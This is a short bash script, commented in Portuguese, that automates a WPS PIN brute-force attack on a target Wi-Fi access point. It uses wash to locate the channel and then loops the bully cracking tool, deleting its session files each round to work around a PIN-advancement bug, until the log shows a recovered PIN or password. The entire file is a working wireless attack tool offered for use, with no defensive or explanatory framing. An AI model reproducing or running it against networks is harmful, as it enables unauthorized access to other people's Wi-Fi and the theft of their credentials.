#!/bin/bash
# WPS PIN brute force with bully - workaround for PIN advancement bug
BSSID=$1
ESSID=$2
INTERFACE=${3:-buS1}
LOG=/root/wifi/wps_brute_${ESSID}.log
SESSION_DIR=/root/.bully

rm -f $SESSION_DIR/*.run $SESSION_DIR/*.pins

echo "$(date) - Iniciando WPS brute force em $ESSID ($BSSID)" | tee -a $LOG

# Primeiro, encontra o canal atual com wash
CHANNEL=$(wash -i $INTERFACE -2 2>/dev/null | grep "$BSSID" | awk '{print $2}')
if [ -z "$CHANNEL" ]; then
    echo "$(date) - ERRO: não encontrou $ESSID via wash" | tee -a $LOG
    exit 1
fi
echo "$(date) - $ESSID está no CH $CHANNEL" | tee -a $LOG

PIN_COUNT=0
while true; do
    rm -f $SESSION_DIR/*.run $SESSION_DIR/*.pins
    echo "$(date) - Tentando bully no CH $CHANNEL..." | tee -a $LOG

    timeout 30 bully $INTERFACE -b $BSSID -c $CHANNEL -v 3 2>&1 | tee -a $LOG

    # Verifica se o bully encontrou a senha
    if grep -q "(M5-M2)" $LOG 2>/dev/null || grep -q "pin is" $LOG 2>/dev/null; then
        PASSWORD=$(grep "pin is" $LOG | tail -1)
        echo "$(date) - SENHA ENCONTRADA! $PASSWORD" | tee -a $LOG
        exit 0
    fi

    PIN_COUNT=$((PIN_COUNT + 1))
    echo "$(date) - Tentativa $PIN_COUNT concluída, continuando..." | tee -a $LOG
    sleep 2
done
